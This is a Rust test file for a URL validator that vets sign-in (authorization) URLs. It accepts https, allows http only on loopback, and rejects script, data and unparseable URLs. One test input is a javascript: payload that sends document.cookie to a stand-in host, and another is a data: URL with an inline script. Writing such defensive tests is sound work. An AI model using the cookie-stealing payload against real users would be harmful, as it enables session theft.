use super::*;

#[test]
fn an_https_sign_in_page_passes() {
    assert_eq!(
        vet_authorization_url(
            "https://auth.example.com/authorize?state=s",
            AddressPolicy::PublicOnly
        ),
        Ok(())
    );
}

#[test]
fn http_passes_only_on_loopback_and_only_locally() {
    for url in [
        "http://127.0.0.1:8790/authorize",
        "http://localhost:8790/authorize",
        "http://[::1]:8790/authorize",
    ] {
        assert_eq!(
            vet_authorization_url(url, AddressPolicy::AnyAddress),
            Ok(()),
            "{url}"
        );
        assert_eq!(
            vet_authorization_url(url, AddressPolicy::PublicOnly),
            Err(UnsafeAuthorizationUrl::Scheme("http".to_owned())),
            "{url}"
        );
    }
    for url in [
        "http://auth.example.com/authorize",
        "http://127.0.0.2/authorize",
        "http://0.0.0.0/authorize",
    ] {
        assert_eq!(
            vet_authorization_url(url, AddressPolicy::AnyAddress),
            Err(UnsafeAuthorizationUrl::Scheme("http".to_owned())),
            "{url}"
        );
    }
}

#[test]
fn script_and_data_urls_are_refused() {
    assert_eq!(
        vet_authorization_url(
            "javascript:fetch('//x/'+document.cookie)//?state=s",
            AddressPolicy::AnyAddress
        ),
        Err(UnsafeAuthorizationUrl::Scheme("javascript".to_owned()))
    );
    assert_eq!(
        vet_authorization_url(
            "data:text/html,<script>alert(1)</script>",
            AddressPolicy::AnyAddress
        ),
        Err(UnsafeAuthorizationUrl::Scheme("data".to_owned()))
    );
}

#[test]
fn an_unparseable_url_is_refused() {
    assert_eq!(
        vet_authorization_url("not a url", AddressPolicy::AnyAddress),
        Err(UnsafeAuthorizationUrl::Unparseable)
    );
}
